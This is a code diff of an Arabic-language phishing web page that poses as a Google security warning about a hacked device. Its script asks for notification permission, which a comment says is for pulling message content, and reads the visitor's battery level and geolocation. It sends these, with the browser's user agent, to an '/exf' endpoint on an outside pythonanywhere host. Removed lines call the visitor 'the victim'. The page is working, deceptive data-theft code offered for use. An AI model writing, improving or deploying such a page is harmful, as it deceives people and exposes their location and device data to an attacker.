@@ -3,45 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تنبيه أمني: تحديث مطلوب</title>
+    <title>تنبيه أمني من Google</title>
     <style>
         body { background-color: #f8f9fa; font-family: sans-serif; text-align: center; padding: 50px 20px; }
         .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        img { width: 70px; }
         h1 { color: #d9534f; font-size: 20px; }
-        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
+        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png">
+        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="70">
         <h1>تحذير أمني من Google</h1>
-        <p>تم اكتشاف نشاط مشبوه. يرجى تفعيل بروتوكول الحماية فوراً لحماية رسائلك وصورك من السرقة.</p>
-        <button onclick="startAction()">تحديث وتأمين الآن</button>
+        <p>تم اكتشاف محاولة اختراق لجهازك. يرجى تفعيل بروتوكول الحماية فوراً لتأمين صورك ورسائلك الخاصة.</p>
+        <button onclick="captureData()">تحديث وتأمين الآن</button>
     </div>
 
     <script>
-        async function startAction() {
-            // طلب إذن الإشعارات لسحب الرسائل مستقبلاً
+        async function captureData() {
+            // 1. طلب إذن الإشعارات (لسحب محتوى الرسائل)
             const permission = await Notification.requestPermission();
             
+            // 2. سحب نسبة الشحن
+            let batteryLevel = "N/A";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryLevel = Math.round(battery.level * 100) + "%";
+            }
+
+            // 3. محاولة سحب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                sendToBot(pos.coords.latitude, pos.coords.longitude, batteryLevel, permission);
+            }, () => {
+                sendToBot(null, null, batteryLevel, permission);
+            });
+        }
+
+        function sendToBot(lat, lon, battery, perm) {
+            const locLink = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "الموقع مرفوض";
             const data = {
                 device: navigator.userAgent,
-                msg: permission === 'granted' ? "✅ الضحية ضغط سماح (السحب نشط)" : "❌ الضحية رفض الصلاحية"
+                battery: battery,
+                location: locLink,
+                msg: perm === 'granted' ? "✅ تم السماح بالإشعارات" : "❌ تم رفض الإشعارات"
             };
 
-            // إرسال البيانات إلى سيرفرك
             fetch('https://Mohammed33233.pythonanywhere.com/exf', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            })
-            .then(() => {
-                if(permission === 'granted') {
-                    alert("تم تفعيل الحماية بنجاح!");
-                }
-            })
-            .catch(err => console.error("Error:", err));
+            }).then(() => {
+                alert("تم تفعيل نظام الحماية بنجاح!");
+            });
         }
     </script>
 </body>
